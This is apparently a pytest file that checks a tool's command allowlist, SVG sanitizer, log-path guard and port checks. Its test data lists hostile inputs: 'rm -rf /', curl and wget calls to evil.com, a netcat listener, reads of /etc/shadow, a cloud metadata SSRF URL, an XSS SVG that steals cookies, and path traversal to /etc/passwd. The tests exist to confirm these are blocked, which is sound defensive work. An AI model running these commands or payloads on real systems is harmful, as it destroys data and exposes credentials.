"""Security boundaries, SSRF protection, command execution, and port isolation tests (T-2, T-3, T-5, T-6)."""

import pytest
import os
import tempfile
from portly.backend.actions.docker_actions import (
    parse_and_validate_safe_command,
    SAFE_COMMAND_ALLOWLIST,
    FORBIDDEN_OPERATORS,
)
from portly.backend.actions import process_actions
from portly.backend.favicon import sanitize_svg
from portly.backend.ports import check_port_availability, can_bind_port
from portly.backend.store import Store


def test_command_execution_boundaries_forbidden_operators():
    """Shell chaining operators and injection vectors are strictly blocked (T-2)."""
    malicious_commands = [
        "ls; rm -rf /",
        "ps aux && curl http://evil.com",
        "cat /etc/hosts || id",
        "echo `whoami`",
        "df -h | grep sda",
        "cat $(echo /etc/passwd)",
        "ping 127.0.0.1 &",
        "cat < /etc/shadow",
        "cat > /root/.ssh/authorized_keys",
    ]

    for cmd in malicious_commands:
        with pytest.raises((ValueError, PermissionError)):
            parse_and_validate_safe_command(cmd)


def test_command_execution_boundaries_allowlist():
    """Only sanctioned read-only diagnosis commands are executable (T-2)."""
    # Safe allowed commands pass
    for cmd in ["ps aux", "df -h", "netstat -tuln", "uname -a", "whoami", "uptime"]:
        parsed = parse_and_validate_safe_command(cmd)
        assert isinstance(parsed, list)
        assert len(parsed) >= 1

    # Disallowed binary executions fail
    disallowed = [
        "cat /etc/shadow",
        "env sh -c id",
        "nc -lvp 4444",
        "python -c 'import os; os.system(\"id\")'",
        "bash -i",
        "curl http://169.254.169.254/latest/meta-data/",
        "wget http://evil.com/malware",
        "gcc exploit.c",
        "sudo su",
    ]
    for cmd in disallowed:
        with pytest.raises((ValueError, PermissionError)):
            parse_and_validate_safe_command(cmd)


def test_svg_sanitization_xss_protection():
    """Malicious SVG favicons containing scripts or event handlers are stripped (S-8)."""
    malicious_svg = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <script>alert('XSS')</script>
      <circle cx="50" cy="50" r="40" fill="red" onload="alert(document.cookie)" onerror="steal()" />
      <a href="javascript:alert(1)"><text y="20">Click me</text></a>
    </svg>"""

    sanitized = sanitize_svg(malicious_svg)
    assert "<script" not in sanitized.lower()
    assert "onload" not in sanitized.lower()
    assert "onerror" not in sanitized.lower()
    assert "javascript:" not in sanitized.lower()
    assert "<circle" in sanitized


def test_process_log_path_traversal_blocked(tmp_path):
    """Log reading strictly enforces path allowlist within tempdir or portly data (S-10)."""
    store = Store(str(tmp_path / "test_proc.db"))

    # _is_safe_log_path returns False for traversal or sensitive files
    assert process_actions._is_safe_log_path("../../../../etc/passwd") is False
    assert process_actions._is_safe_log_path("C:\\Windows\\System32\\config\\sam") is False

    # Attempting to read unauthorized log path via get_custom_app_logs returns Access Denied
    store.create_custom_app(
        app_id="evil_app",
        name="Evil",
        port=9999,
        log_file="../../../../etc/passwd"
    )
    logs = process_actions.get_custom_app_logs("custom:evil_app", store=store)
    assert any("Access denied" in line for line in logs)

    # Allowed in temp directory
    temp_log = os.path.join(tempfile.gettempdir(), "test_portly_log.log")
    with open(temp_log, "w") as f:
        f.write("Server started successfully on port 8000\nReady for connections.\n")

    try:
        assert process_actions._is_safe_log_path(temp_log) is True
        store.create_custom_app(
            app_id="good_app",
            name="Good",
            port=8000,
            log_file=temp_log
        )
        content = process_actions.get_custom_app_logs("custom:good_app", store=store)
        assert any("Server started successfully" in line for line in content)
    finally:
        if os.path.exists(temp_log):
            os.remove(temp_log)


def test_port_protocol_disambiguation_tcp_vs_udp():
    """TCP and UDP sockets on the same port are distinct and do not falsely collide (T-5, P1-14)."""
    # A TCP check and a UDP check specify distinct proto
    tcp_avail = check_port_availability(5533, "127.0.0.1", proto="tcp")
    udp_avail = check_port_availability(5533, "127.0.0.1", proto="udp")

    assert "free" in tcp_avail
    assert "free" in udp_avail
    # Both returns have proper schema
    assert isinstance(tcp_avail["free"], bool)
    assert isinstance(udp_avail["free"], bool)
